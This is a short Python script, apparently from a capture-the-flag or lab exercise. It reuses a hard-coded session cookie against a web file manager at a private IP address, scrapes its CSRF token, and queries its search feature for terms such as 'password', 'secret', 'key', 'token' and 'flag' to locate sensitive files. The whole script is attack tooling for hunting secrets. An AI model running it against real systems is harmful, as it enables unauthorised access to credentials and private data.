import urllib.request, urllib.parse, re, json

cookie = 'filemanager=31d9d419d12f4fb42c375d7c8e04fdb7'

# 1. Fetch current csrf token
req = urllib.request.Request('http://192.168.60.139/index.php?p=', headers={'Cookie': cookie})
with urllib.request.urlopen(req) as r:
    html = r.read().decode('utf-8', errors='ignore')

csrf = re.search(r"window\.csrf\s*=\s*'([^']+)'", html).group(1)
print(f"CSRF token: {csrf}")

for query in ['flag', 'mitigata', 'secret', 'password', 'log', 'pass', 'key', 'token', 'admin', 'root']:
    data = urllib.parse.urlencode({
        'ajax': 'true',
        'content': query,
        'path': '',
        'type': 'search',
        'token': csrf
    }).encode()
    
    post_req = urllib.request.Request(
        'http://192.168.60.139/index.php?p=',
        data=data,
        headers={
            'Cookie': cookie,
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        }
    )
    try:
        with urllib.request.urlopen(post_req, timeout=3) as resp:
            res = resp.read().decode('utf-8', errors='ignore')
            print(f"Search '{query}': {res[:200]}")
    except Exception as e:
        print(f"Search '{query}' error: {e}")

